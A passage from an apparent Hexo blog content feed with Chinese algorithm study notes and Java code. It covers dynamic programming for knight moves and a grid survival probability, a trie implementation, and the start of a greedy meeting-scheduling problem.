class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&lt;</span>  <span class="token number">0</span> <span class="token operator">||</span> x <span class="token operator">></span> <span class="token number">8</span> <span class="token operator">||</span> y <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> y <span class="token operator">></span> <span class="token number">9</span> <span class="token operator">||</span> k <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x05-题目五"><a href="#0x05-题目五" class="headerlink" title="0x05 题目五"></a>0x05 题目五</h3><p>给定五个参数n,m,i,j,k</p><p>表示在一个N*M的区域，Bob处在(i,j)点，每次Bob等概率的向上、下、左、右四个方向移动一步，Bob必须走K步</p><p>如果走完之后，Bob还停留在这个区域上， 就算Bob存活，否则就算Bob死亡</p><p>请求解Bob的生存概率，返回字符串表示分数的方式</p><h4 id="1-0-5"><a href="#1-0-5" class="headerlink" title="1.0"></a>1.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">gcd</span><span class="token punctuation">(</span><span class="token keyword">long</span> a<span class="token punctuation">,</span> <span class="token keyword">long</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> b <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> a <span class="token operator">:</span> <span class="token function">gcd</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> i <span class="token operator">>=</span> n <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">>=</span> m<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rest <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> live <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span> rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span> rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token punctuation">,</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> live<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">BobDie</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> all <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> live <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> gcd <span class="token operator">=</span> <span class="token function">gcd</span><span class="token punctuation">(</span>live<span class="token punctuation">,</span> all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>live<span class="token operator">/</span>gcd<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>all<span class="token operator">/</span>gcd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-2"><a href="#3-0-2" class="headerlink" title="3.0"></a>3.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">BobDie2</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>n<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>row<span class="token operator">&lt;</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>row<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> col<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>col<span class="token operator">&lt;</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>col<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> rest<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">&lt;</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>row<span class="token operator">&lt;</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>row<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> col<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>col<span class="token operator">&lt;</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>col<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>row<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">long</span> all <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> live <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> gcd <span class="token operator">=</span> <span class="token function">gcd</span><span class="token punctuation">(</span>live<span class="token punctuation">,</span> all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>live<span class="token operator">/</span>gcd<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>all<span class="token operator">/</span>gcd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>DP数组需要注意的是，可变的参数一定要满足</p><p>1）都是整型，即一维，而不应该是更高维的如数组</p><p>2）参数个数尽量少</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 左程云 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>左神算法0x03</title>
      <link href="/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x03/"/>
      <url>/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x03/</url>
      
        <content type="html"><![CDATA[<p>【前缀树，贪心算法，暴力递归，N皇后】</p><h2 id="前缀树"><a href="#前缀树" class="headerlink" title="前缀树"></a>前缀树</h2><p>有一些字符串数组，对这个数组生成前缀树</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm3_f1.png"></p><p>节点类如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">TrieNode</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> path<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> end<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">TrieNode</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nexts<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">TrieNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        path <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        nexts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrieNode</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>path</code>值指的是经过该节点的字符串有几个，<code>end</code>值指的是以该节点结尾的字符串有几个，大小为26的<code>nexts</code>数组表示26个字母，每个字母下面连着哪条路，为<code>null</code>当然是指没有指向这个字母的路，具体如图</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm3_f2.png"></p><p>根节点的含义代表的就是空字符串</p></blockquote><p>前缀树具体有什么作用呢？</p><p>1）可以查询某个字符串被放进去多少次，只需要顺着<code>nexts</code>数组往下找，直到字符串结束，查看这个节点的<code>end</code>值即可，碰到<code>null</code>当然是没有这个字符串</p><p>2）可以查询以某个字符串为前缀的字符串有多少个，同理，顺着字符串直到结束，查看这个节点的<code>path</code>值即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> trieTree<span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">TrieNode</span> root<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">trieTree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrieNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token class-name">TrieNode</span> node <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> chr<span class="token operator">:</span>chars<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            index <span class="token operator">=</span> chr <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrieNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            node<span class="token punctuation">.</span>path<span class="token operator">++</span><span class="token punctuation">;</span>            node <span class="token operator">=</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        node<span class="token punctuation">.</span>path<span class="token operator">++</span><span class="token punctuation">;</span>        node<span class="token punctuation">.</span>end<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">search</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">TrieNode</span> node <span class="token operator">=</span> root<span class="token punctuation">;</span>            <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> index<span class="token punctuation">;</span>            node<span class="token punctuation">.</span>path<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> chr<span class="token operator">:</span>chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                index <span class="token operator">=</span> chr <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">--</span>node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                node <span class="token operator">=</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            node<span class="token punctuation">.</span>end<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">TrieNode</span> node <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> chr<span class="token operator">:</span>chars<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            index <span class="token operator">=</span> chr <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            node <span class="token operator">=</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> node<span class="token punctuation">.</span>end<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">countPrefix</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">TrieNode</span> node <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> chr<span class="token operator">:</span>chars<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            index <span class="token operator">=</span> chr <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            node <span class="token operator">=</span> node<span class="token punctuation">.</span>nexts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> node<span class="token punctuation">.</span>path<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h2><p>在某一个标准下，优先考虑最满足标准的样本，最后考虑最不满足标准的样本，最终得到一个答案的算法</p><blockquote><p>解题套路（对数器验证自己的贪心算法是否正确）：</p><ol><li>实现一个暴力绝对正确的方法X</li><li>使用对数器，去验证自己的贪心策略</li><li>不要去纠结贪心策略的证明</li></ol></blockquote><h3 id="0x01-安排会议"><a href="#0x01-安排会议" class="headerlink" title="0x01 安排会议"></a>0x01 安排会议</h3><p>一些项目要占用一个会议室宣讲，会议室不能同时容纳两个项目的宣讲。 给你每一个项目开始的时间和结束的时间(给你一个数组，里面是一个个具体的项目)，你来安排宣讲的日程，要求会议室进行的宣讲的场次最多， 